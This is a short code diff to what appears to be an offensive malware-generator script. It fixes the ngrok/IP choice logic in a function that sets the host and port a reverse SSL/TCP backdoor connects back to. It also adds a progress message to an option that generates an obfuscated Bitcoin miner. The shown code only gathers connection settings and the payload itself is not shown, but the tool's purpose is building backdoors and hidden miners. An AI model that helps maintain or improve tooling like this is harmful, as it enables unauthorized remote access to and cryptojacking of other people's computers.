@@ -221,13 +221,13 @@ def gen_rev_ssl_tcp():
     global port
     name = 'ocr'
     ngrokchoice=input('Do you want to use ngrok port forwarding? (must have activated this in setup.py) y/n: ')
-    if ngrokchoice=='y' or 'Y':
+    if ngrokchoice=='y':
         port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
         input('Please run this command in another terminal "ngrok tcp '+ port+'" Press enter when you have done this: ')
         ripgrokhostnport=(get_tunnels())
         host=ripgrokhostnport.split(':')[0]
         port=ripgrokhostnport.split(':')[1]
-    else:
+    if ngrokchoice=='n':
         host = input('Please enter the ip you wish the backdoor to connect back to: ')
         port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
@@ -626,6 +626,7 @@ if nscan == "3":
 if nscan == '4':
     gen_btc_miner()
     opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
+    print("obfuscating... (might take a few minutes due to the layer based obfuscation)")
     encrypted = False
     if opt_obf == 'y':
         encrypted = True
